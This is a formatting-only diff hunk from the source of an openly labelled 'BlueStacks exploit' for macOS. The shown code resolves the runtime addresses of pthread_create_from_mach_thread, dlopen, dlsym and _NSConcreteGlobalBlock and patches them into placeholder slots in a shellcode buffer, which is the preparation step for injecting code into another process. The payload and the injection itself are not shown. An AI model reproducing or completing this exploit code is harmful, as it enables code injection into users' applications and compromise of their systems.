@@ -79,29 +79,28 @@ int main(int argc, const char * argv[]) {
     printf("=== Starting BlueStacks exploit ===\n");
     printf("[+] Resolving symbols required for shellcode [pthread_create_from_mach_thread, dlopen, dlsym, _NSConcreteGlobalBlock]\n");
 
-  	void * lidpthread_handle = dlopen("/usr/lib/system/libsystem_pthread.dylib", RTLD_LAZY);
-  	void * lipthread_ptr = dlsym(lidpthread_handle, "pthread_create_from_mach_thread");
+    void * lidpthread_handle = dlopen("/usr/lib/system/libsystem_pthread.dylib", RTLD_LAZY);
+    void * lipthread_ptr = dlsym(lidpthread_handle, "pthread_create_from_mach_thread");
 
-	find_and_replace_symbol("__PTRD__", lipthread_ptr);
+    find_and_replace_symbol("__PTRD__", lipthread_ptr);
     printf("[+] Resolved pthread_create_from_mach_thread to: %p\n", lipthread_ptr);
 	
-	void *libdyld_handle = dlopen("/usr/lib/system/libdyld.dylib", RTLD_LAZY);
-  	void * dlopen_ptr = dlsym(libdyld_handle, "dlopen");
+    void *libdyld_handle = dlopen("/usr/lib/system/libdyld.dylib", RTLD_LAZY);
+    void * dlopen_ptr = dlsym(libdyld_handle, "dlopen");
 
-  	find_and_replace_symbol("__DLOP__", dlopen_ptr);
+    find_and_replace_symbol("__DLOP__", dlopen_ptr);
     printf("[+] Resolved dlopen to: %p\n", dlopen_ptr);
 
-  	void * dlsym_ptr = dlsym(libdyld_handle, "dlsym");
+    void * dlsym_ptr = dlsym(libdyld_handle, "dlsym");
 
-  	find_and_replace_symbol("__DLYS__", dlsym_ptr);
+    find_and_replace_symbol("__DLYS__", dlsym_ptr);
     printf("[+] Resolved dlsym to: %p\n", dlsym_ptr);
 
-  	void *lidobjc_handle = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
-  	void * block_ptr = dlsym(lidobjc_handle, "_NSConcreteGlobalBlock");
+    void *lidobjc_handle = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
+    void * block_ptr = dlsym(lidobjc_handle, "_NSConcreteGlobalBlock");
 
-  	find_and_replace_symbol("__BLOC__", block_ptr);
-
-  	printf("[+] Resolved _NSConcreteGlobalBlock to: %p\n", block_ptr);
+    find_and_replace_symbol("__BLOC__", block_ptr);
+    printf("[+] Resolved _NSConcreteGlobalBlock to: %p\n", block_ptr);
 
     @autoreleasepool {
         
